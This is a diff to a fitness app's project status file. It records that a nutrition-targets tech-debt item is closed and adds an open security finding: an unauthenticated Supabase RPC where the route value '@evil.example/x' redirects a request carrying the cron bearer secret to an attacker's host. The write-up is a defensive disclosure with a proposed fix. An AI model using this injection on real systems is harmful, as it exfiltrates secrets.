@@ -1,6 +1,6 @@
 # Current State — FitnessApp
 
-**Last updated:** 2026-08-26 (CI pipeline, format normalization, TD-019, security fixes, coverage-audit bug fixes)
+**Last updated:** 2026-08-27 (TD-030 closed — tech-debt register now empty; CI, format normalization, TD-019, security fixes, coverage-audit bug fixes)
 **Overall health:** Stable. TypeScript clean. 244 tests pass. Lint clean. Production build succeeds. **All migrations through `20260722180000` have been applied to the live Supabase project** (done directly via the Supabase MCP connector this session — no more manual `supabase db push` step outstanding for those). Withings and Apple Health are live and verified. **Strava now requires a paid subscription to keep API access** (a Strava policy change, not something fixable in this codebase) — the user has chosen not to subscribe, so Strava is being retired as the cardio path in favor of Apple Health (see below). Peloton's unofficial API auth endpoint is also confirmed blocked by Peloton as of 2026-07-16 — direct Peloton sync is not viable either way.
 
 This session ran a full product/UX/security/fitness-safety audit (see "What Was Done in This Session (2026-08-02, fitness-safety audit)" below), using parallel research passes over (a) strength/cardio unit conversion and progression logic and (b) security/auth/accessibility. Four concrete fixes shipped:
@@ -22,7 +22,7 @@ This session's audit found the app's integration/data-integrity layer (auth, OAu
 | ------------ | ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | TypeScript   | CLEAN   | Zero errors across all 6 packages                                                                                                                                                                                                                                                                  |
 | Lint         | CLEAN   | No warnings                                                                                                                                                                                                                                                                                        |
-| Tests        | PASSING | 434/434 (102 web, 274 application, 14 integrations, 44 jobs)                                                                                                                                                                                                                                        |
+| Tests        | PASSING | 441/441 (102 web, 281 application, 14 integrations, 44 jobs)                                                                                                                                                                                                                                        |
 | Build        | PASSING | `pnpm build` succeeds without a live `.env.local` — all data-dependent routes are dynamic, so no Supabase connectivity is needed at build time                                                                                                                                                     |
 | E2E          | READY   | Playwright configured, 6 spec files (auth, navigation, body, cardio, integrations, weekly-review). Not run in CI — needs a live Supabase project.                                                                                                                                                                                                  |
 | Database     | LIVE    | Cloud Supabase project, credentials in .env.local                                                                                                                                                                                                                                                  |
@@ -115,7 +115,7 @@ None of the four cron routes have retry logic, a queue, or a dead-letter path �
 
 1. **Strava broken** — app deactivated on Strava's side (`403: Application Status Inactive`), confirmed via a failed `sync_job_runs` row on 2026-07-16. User must reactivate at strava.com/settings/api. This blocks the recommended Peloton→Strava relay path too.
 2. **Peloton direct sync blocked by Peloton** — `POST https://api.onepeloton.com/auth/login` returns `403` for any credentials as of 2026-07-16. Not fixable without reverse-engineering around a deliberate access restriction. Recommended path is now Peloton's own "auto-export to Strava" setting, once Strava is reactivated.
-3. **Nutrition calorie/protein targets don't account for age, height, or sex** (TD-030) — see `TECH_DEBT.md` Priority 1. Partially mitigated this session (safety floor + UI disclosure); full fix needs a schema migration.
+3. **None.** TD-030 was the last Priority 1 item and closed 2026-08-27; the tech-debt register is currently empty.
 
 ### Low
 
@@ -170,7 +170,7 @@ See `TECH_DEBT.md` for full prioritized list.
 
 ## Active Priorities (Recommended Next Sprint)
 
-See `docs/next-release-roadmap.md` for the full ranked list. In brief: TD-030 (personalize nutrition targets — the last Priority 1 item, needs an additive migration verified against the live DB), browser e2e for the six uncovered modules, and a decision on whether to keep the Strava/Peloton code paths at all.
+See `docs/next-release-roadmap.md` for the full ranked list. The tech-debt register is now empty. In brief: browser e2e for the six uncovered modules, a decision on whether to keep the Strava/Peloton code paths at all, and the `trigger_cron_route` DB-permission finding below.
 
 1. User: set a target weight/date under Settings → Training Goals, and create/pin your M/W/F strength templates with a scheduled day under `/strength` (adjusted for your current meniscus injury as needed) — the underlying capability (TD-027) is built and the migration is live, but the actual numbers/templates are personal data this container has no way to enter on your behalf
 2. User: once you're back to riding, set up a bridge app (e.g. Health Auto Export) to POST workout data to `/api/integrations/apple-health/workouts` — see `docs/integrations/apple-health-bridge-setup.md` for the exact payload shape. This is now the recommended free cardio-sync path since Strava requires a paid subscription.
@@ -215,6 +215,24 @@ Started from a verified baseline (typecheck/lint/test/build all clean, 269/269, 
 - The `check_suite.completed` webhooks arriving during the gap were Vercel's, not this workflow's, so PR events alone read as "CI fine" while this CI had not run. Verify the workflow run itself on the head SHA.
 
 `cancel-in-progress: true` is still the right setting (it stops a queue of superseded runs burning minutes), but it means that after a burst of pushes only the final head is actually verified in CI. That is fine when every intermediate commit was validated locally, which is the convention here.
+
+11. **TD-030 closed — nutrition targets are personalized.** `height_cm`, `birth_date`, and `biological_sex` added to `profiles` (nullable, no default) and wired end to end. Both this migration and the TD-019 index re-predicate were applied to the live Supabase project on 2026-08-27 **with the user's explicit approval**, then verified: the repository's exact `PROFILE_SELECT` returns the new columns, the existing profile still reads back, and row counts were unchanged. `birth_date` rather than an age integer so the age can't drift stale. Unknown/declined sex uses the midpoint of the two Mifflin-St Jeor constants rather than the male one, since defaulting to male silently overestimates BMR for about half of users. The `notes[]` disclosure now names exactly which inputs fell back to a population average.
+
+### Open security finding — `public.trigger_cron_route` is callable by `anon`
+
+Surfaced by `get_advisors` after the schema change; **pre-existing, not introduced by it**, and left unfixed because changing production DB permissions was outside what was authorized.
+
+`trigger_cron_route(route_path text)` is `SECURITY DEFINER`, reads `cron_bearer_secret` and `cron_target_base_url` from Vault, and calls `net.http_post(url := v_base_url || route_path, headers := {Authorization: Bearer <secret>})`. Its ACL grants `EXECUTE` to `anon` and `authenticated`, so it is reachable unauthenticated via `POST /rest/v1/rpc/trigger_cron_route`.
+
+`route_path` is concatenated onto the base URL with no validation. Verified with Node's WHATWG URL parser that `"@evil.example/x"` turns `https://<app>` into `https://<app>@evil.example/x`, whose **host is `evil.example`** — so a caller can direct the request, with the real cron bearer secret in the Authorization header, at a server they control. That is unauthenticated exfiltration of `CRON_SECRET`, plus arbitrary triggering of the sync/insight jobs.
+
+Both `cron.job` entries run as `postgres` (verified), and no application code calls this RPC (verified by grep), so revoking from `anon`/`authenticated`/`PUBLIC` should not break the schedule:
+
+```sql
+revoke execute on function public.trigger_cron_route(text) from public, anon, authenticated;
+```
+
+Worth also validating `route_path` against an allowlist inside the function, so a future caller can't escape the base URL.
 
 ---
 
